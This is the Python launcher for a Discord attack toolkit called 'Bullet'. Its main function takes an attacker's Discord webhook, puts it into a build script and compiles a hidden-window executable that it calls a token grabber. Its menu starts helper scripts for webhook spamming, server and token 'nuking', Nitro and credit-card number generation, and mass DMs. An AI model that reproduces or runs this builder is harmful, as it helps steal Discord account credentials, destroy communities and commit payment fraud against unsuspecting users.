import os
import time as t
import uuid
import subprocess as s
import colorama
import shutil
from colorama import *
from colorama import Fore
from pystyle import *
os.system("cls")

w = Fore.WHITE
r = Fore.RED
b = Fore.LIGHTBLACK_EX
g = Fore.LIGHTGREEN_EX
c = Fore.CYAN
m = Fore.LIGHTMAGENTA_EX
ll = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
fr = Fore.RESET
ly = Fore.LIGHTYELLOW_EX

def clear():
    os.system("cls" if os.name=="nt" else "clear")

intro = f"""

 ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄     ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
█  ▄    █  █ █  █   █   █   █   █       █       █
█ █▄█   █  █ █  █   █   █   █   █    ▄▄▄█▄     ▄█
█       █  █▄█  █   █   █   █   █   █▄▄▄  █   █         {b} Made By bullet.org
█  ▄   ██       █   █▄▄▄█   █▄▄▄█    ▄▄▄█ █   █  
█ █▄█   █       █       █       █   █▄▄▄  █   █  
█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█  


"""
Anime.Fade(Center.Center(intro), Colors.red_to_black, Colorate.Vertical, interval=0.035, enter=True)

def grabbing():
    hook = input(f" {lr} Discord Webhook : {b}")
    UI = str(uuid.uuid4())
    sf = f"Bullet_{UI}.py"
    ef = f"Bullet_{UI}.exe"

    shutil.copy("build.py", sf)
    with open(sf, "r+", encoding="utf-8") as f:
        content = f.read()
        f.seek(0,0)
        content = content.replace("bulleting_hookz", hook)
        f.write(content)
    s.call(f"pyinstaller --onefile --noconsole {sf} --name {ef}", shell=True)
    print(f"\n{b} You can find the token grabber in dist folder.")
    os.remove(sf)
    input(f"{b}Press {lr}[{b}ENTER{lr}] {b}to continue")

def logo():
    print(Fore.RED + """

                                     ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄     ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
                                    █  ▄    █  █ █  █   █   █   █   █       █       █
                                    █ █▄█   █  █ █  █   █   █   █   █    ▄▄▄█▄     ▄█
                                    █       █  █▄█  █   █   █   █   █   █▄▄▄  █   █  
                                    █  ▄   ██       █   █▄▄▄█   █▄▄▄█    ▄▄▄█ █   █  
                                    █ █▄█   █       █       █       █   █▄▄▄  █   █  
                                    █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█  


""")
    
def main():
    print(f"""

                        {lr}[{b}01{lr}]{b} Bullet Token Grabber     {lr}[{b}06{lr}]{b} Token Lookup      {lr}[{b}11{lr}]{b} IP lookup
                        {lr}[{b}02{lr}]{b} Webhook Spammer          {lr}[{b}07{lr}]{b} Server Lookup     {lr}[{b}12{lr}]{b} N/A
                        {lr}[{b}03{lr}]{b} Webhook Deleter          {lr}[{b}08{lr}]{b} Nitro Generator   {lr}[{b}13{lr}]{b} N/A
                        {lr}[{b}04{lr}]{b} Server Nuker             {lr}[{b}09{lr}]{b} CC Generator      {lr}[{b}14{lr}]{b} N/A
                        {lr}[{b}05{lr}]{b} Token Nuker              {lr}[{b}10{lr}]{b} Bot Mass DM       {lr}[{b}15{lr}]{b} N/A


""")
    a = input(f" {b}<{lr}root{b}@{lr}bullet{b}> ")

    if a == "1":
        grabbing()
    if a == "2":
        s.call("python util\spam.py", shell=True)
    if a == "3":
        s.call("python util\deleter.py", shell=True)
    if a == "4":
        s.call("python util\snuker.py", shell=True)
    if a == "5":
        s.call("python util\destroyer.py", shell=True)
    if a == "6":
        print(f"{lr} Shit my not be working.")
        s.call("python util\lookup.py", shell=True)
    if a == "7":
        s.call("python util\slookup.py", shell=True)
    if a == "8":
        print(f"{lr} Unchecked Codes")
        s.call("python util\codez.py", shell=True)
        input()
    if a == "9":
        s.call("python util\ccgen.py", shell=True)
    if a == "10":
        s.call("python util\massdm.py", shell=True)
    if a == "11":
        s.call("python util\iplookup.py", shell=True)    

while True:
    clear()
    logo()
    main()
